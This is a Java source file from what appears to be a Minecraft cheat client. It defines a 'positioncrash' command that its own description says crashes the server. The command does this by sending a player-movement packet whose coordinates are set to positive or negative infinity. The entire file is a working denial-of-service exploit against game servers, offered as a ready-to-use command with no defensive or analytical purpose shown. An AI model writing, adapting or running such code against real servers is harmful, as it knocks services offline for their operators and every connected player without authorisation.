package net.como.client.commands.impl;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.como.client.ComoClient;
import net.como.client.commands.Command;
import net.como.client.utils.ChatUtils;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

public class PositionCrash extends Command {
    public PositionCrash() {
        super("positioncrash", "Crashes the server by sending an erroneous position packet", "poscrash");
    }

    private void perform(double scalar) {
        ClientPlayNetworkHandler networkHandler = ComoClient.getInstance().getClient().getNetworkHandler();
        networkHandler.sendPacket(
                new PlayerMoveC2SPacket.PositionAndOnGround(scalar, scalar, scalar, true)
        );

        ChatUtils.info("Payload sent.");
    }

    private void perform() {
        perform(Double.POSITIVE_INFINITY); // Default
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(literal("inf").executes(context -> {
            perform(Double.POSITIVE_INFINITY);
            return 1;
        })).then(literal("-inf").executes(context -> {
            perform(Double.NEGATIVE_INFINITY);
            return 1;
        })).executes(context -> {
            perform();
            return 1;
        });
    }
}
